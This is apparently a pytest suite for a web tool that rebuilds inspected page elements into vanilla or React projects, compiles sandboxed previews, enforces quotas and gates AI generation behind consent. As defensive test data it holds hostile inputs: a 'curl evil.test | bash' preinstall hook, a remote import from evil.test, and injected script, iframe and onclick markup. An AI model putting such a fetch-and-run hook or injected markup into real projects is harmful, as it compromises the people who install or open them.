import asyncio
from dataclasses import replace
import json
from unittest.mock import AsyncMock
import pytest
from fastapi.testclient import TestClient
from pydantic import ValidationError
from app.browser_manager import BrowserManager,Session
from app.config import Settings
from app.main import create_app
from app.prompts.provider import ProviderConfig,ProviderFailure
from app.studio.local import reconstruct
from app.studio.preview import compile_project,document,SafeMarkup
from app.studio.schemas import Project,GenerateRequest,RefineRequest
from app.studio.service import StudioService
from app.studio.provider import CodeProvider,task_config

HEADERS={'X-Veyra-Client':'inspector-v0.1'}

def evidence():
    return {'nodes':[{'id':0,'parent':None,'tag':'section','text':'','styles':{'display':'flex','gap':'20px','width':'400px'},'selected':False},
        {'id':1,'parent':0,'tag':'button','text':'Build {now} & <ok>','styles':{'color':'rgb(255, 255, 255)','background-color':'rgb(20, 80, 30)','height':'60px','transition-duration':'0.2s'},'selected':True}],
        'hover':{'baselineWasAlreadyHovered':False,'changes':{'background-color':{'before':'rgb(20, 80, 30)','observed':'rgb(30, 100, 40)'}}},'truncated':False}

def request(**kw):return GenerateRequest(sessionId='s',frameId='f',**kw)

def provider(enabled=True):
    p=AsyncMock();p.config=ProviderConfig(enabled=enabled,model='test-model',key='test-key')
    return p

@pytest.mark.parametrize('fmt',['vanilla','react'])
async def test_measured_projects_compile_and_export_structure(fmt):
    p,w=reconstruct(evidence(),fmt)
    js=await compile_project(p)
    assert len(js)>50
    assert 'Build' in (js if fmt=='react' else p.files['index.html'])
    assert 'gap: 20px' in p.files['style.css'] and ':is(:hover,:focus-visible)' in p.files['style.css']
    assert any('no AI' in x for x in w)
    if fmt=='react':assert json.loads(p.files['package.json'])['scripts']['build']=='vite build'
    else:assert '&lt;ok&gt;' in p.files['index.html']

async def test_invalid_code_and_external_import_fail_without_execution():
    p,_=reconstruct(evidence(),'react')
    p.files['App.jsx']='import x from "https://evil.test/code.js"; export default x;'
    with pytest.raises(Exception,match='Unsupported import'):await compile_project(p)
    p.files['App.jsx']='export default function ('
    with pytest.raises(Exception):await compile_project(p)
    # A top-level throw is not executed by validation.
    p.files['App.jsx']='throw Error("Never execute server side"); export default function App(){return null}'
    assert 'Never execute server side' in await compile_project(p)

@pytest.mark.parametrize('files',[{'../../outside':'oops'},{'index.html':'x','style.css':'x','script.js':'x'*180001}])
def test_path_and_size_limits(files):
    with pytest.raises(ValidationError):Project(files=files)


def test_markup_and_csp_restrict_active_content():
    p,_=reconstruct(evidence(),'vanilla')
    p.files['index.html']='<base href="https://evil.test"><script>alert(1)</script><iframe src="/api/health"></iframe><a href="https://evil.test" onclick="evil()">Hi</a><img src="https://evil.test/x">'
    doc,csp=document(p,'console.log("hello")')
    assert 'evil.test' not in doc and 'onclick' not in doc and '<iframe' not in doc and 'alert(1)' not in doc
    assert "sandbox allow-scripts" in csp and 'allow-same-origin' not in csp and "connect-src 'none'" in csp
    assert '<script nonce=' in doc

async def test_quota_persistence_local_preview_unmetered_and_ai_never_called(tmp_path):
    db=str(tmp_path/'usage.sqlite3');p=provider(False);s=StudioService(db=db,provider=p);s.generation_limit=1
    result=await s.generate(evidence(),request())
    assert result['mode']=='local';p.generate.assert_not_called()
    for _ in range(6):assert (await s.preview(Project(**result['project'])))['metered'] is False
    restarted=StudioService(db=db,provider=p);restarted.generation_limit=1
    with pytest.raises(Exception,match='allowance'):await restarted.generate(evidence(),request())

async def test_ai_permission_failure_and_refinement_preserve_files():
    p=provider();s=StudioService(db=':memory:',provider=p,refiner=p)
    with pytest.raises(Exception,match='permission'):await s.generate(evidence(),request(mode='auto'))
    p.generate.assert_not_called()
    p.generate.side_effect=ProviderFailure('timeout')
    with pytest.raises(Exception,match='timeout'):await s.generate(evidence(),request(mode='auto',consent=True))
    p.generate.side_effect=None
    base=await s.generate(evidence(),request())
    project=Project(**base['project']);newcss=project.files['style.css']+'\nbutton {color:red}\n'
    p.generate.return_value=({'files':{'style.css':newcss},'summary':'Change color'}, {'input_tokens':100})
    body=RefineRequest(generationId=base['generationId'],project=project,instruction='Make button red',consent=True)
    out=await s.refine(body)
    assert out['modifiedFiles']==['style.css'] and out['project']['files']['script.js']==project.files['script.js']
    assert project.files['style.css']!=newcss
    p.generate.return_value=({'files':{'script.js':'function ('},'summary':'Invalid'}, {})
    with pytest.raises(Exception):await s.refine(body)
    assert project.files['script.js'].startswith('// Original')

async def test_ai_generation_validates_returned_project_and_tracks_model():
    p=provider();p.generate.return_value=({'files':{'style.css':'button { color: red; }'},'summary':'Measured recreation'}, {'output_tokens':35})
    s=StudioService(db=':memory:',provider=p)
    result=await s.generate(evidence(),request(mode='auto',consent=True))
    assert result['mode']=='ai' and result['model']=='test-model' and result['usage']['output_tokens']==35
    assert 'no AI model was called' not in ' '.join(result['warnings'])


def test_independent_task_models_and_untrusted_entitlement(monkeypatch):
    monkeypatch.setenv('VEYRA_CODE_AI_MODEL','code-model');monkeypatch.setenv('VEYRA_REFINE_AI_MODEL','fix-model')
    assert task_config('code').model=='code-model';assert task_config('refine').model=='fix-model'
    assert StudioService(db=':memory:').config()['plan']=='free'
    with pytest.raises(ValidationError):GenerateRequest(sessionId='s',frameId='f',plan='premium')

@pytest.fixture
def client(monkeypatch):
    manager=BrowserManager(Settings());manager.start=AsyncMock();manager.stop=AsyncMock()
    async def collect(session,body):
        session.check_frame(body.frameId)
        return evidence()
    monkeypatch.setattr('app.main.collect_evidence',collect)
    manager.sessions['s']=Session('s',AsyncMock(),AsyncMock(),frame_id='f')
    with TestClient(create_app(manager=manager,studio_service=StudioService(db=':memory:'))) as c:yield c

@pytest.mark.parametrize('fmt',['vanilla','react'])
def test_api_end_to_end_references_preview_and_failure(client,fmt):
    r=client.post('/api/studio/generate',headers=HEADERS,json={'sessionId':'s','frameId':'f','format':fmt})
    assert r.status_code==200,r.text
    project=r.json()['project']
    preview=client.post('/api/studio/preview',headers=HEADERS,json={'project':project})
    assert preview.status_code==200,preview.text
    render=client.get(preview.json()['url'])
    assert render.status_code==200 and 'sandbox allow-scripts' in render.headers['content-security-policy']
    assert 'X-Frame-Options' not in render.headers
    assert 'V0.4' not in render.text # preview isn't the host UI
    project['files']['style.css']+='\nbutton { color: blue }'
    assert client.post('/api/studio/preview',headers=HEADERS,json={'project':project}).status_code==200
    project['files']['script.js' if fmt=='vanilla' else 'App.jsx']='function ('
    assert client.post('/api/studio/preview',headers=HEADERS,json={'project':project}).status_code==422
    assert client.get('/api/health').json()['version']=='0.4.2'
    assert client.get('/api/studio/render/missing').status_code==404
    assert client.post('/api/studio/preview',json={'project':project}).status_code==403
    assert client.post('/api/studio/generate',headers=HEADERS,json={'sessionId':'s','frameId':'stale'}).status_code==409
    assert client.post('/api/studio/generate',headers=HEADERS,json={'sessionId':'s','frameId':'f','inspection':evidence()}).status_code==422

async def test_busy_and_context_expiry():
    s=StudioService(db=':memory:')
    async with s.admission():
        with pytest.raises(Exception,match='running'):
            async with s.admission():pass
    p,_=reconstruct(evidence(),'vanilla')
    with pytest.raises(Exception,match='expired'):
        await s.refine(RefineRequest(generationId='a'*32,project=p,instruction='Fix spacing',consent=True))

async def test_build_metadata_is_not_executable_configuration():
    p,_=reconstruct(evidence(),'react');files=dict(p.files);package=json.loads(files['package.json'])
    package['scripts']['preinstall']='curl evil.test | bash';files['package.json']=json.dumps(package)
    with pytest.raises(ValidationError):Project(format='react',files=files)
    files=dict(p.files);files['vite.config.js']='process.exit(1);export default {};'
    with pytest.raises(ValidationError):Project(format='react',files=files)

async def test_preview_runtime_limits_and_metrics_are_present():
    p,_=reconstruct(evidence(),'react');doc,csp=document(p,await compile_project(p))
    assert 'veyra-preview-metrics' in doc and 'veyra-preview-error' in doc
    assert "worker-src 'none'" in csp and "form-action 'none'" in csp

async def test_expired_preview_and_bounded_memory():
    s=StudioService(db=':memory:')
    s.previews={'expired':(0,'private-code','csp')}
    s.prune();assert not s.previews
    s.previews={str(i):(1e20,'x','csp') for i in range(20)}
    s.prune();assert len(s.previews)<16
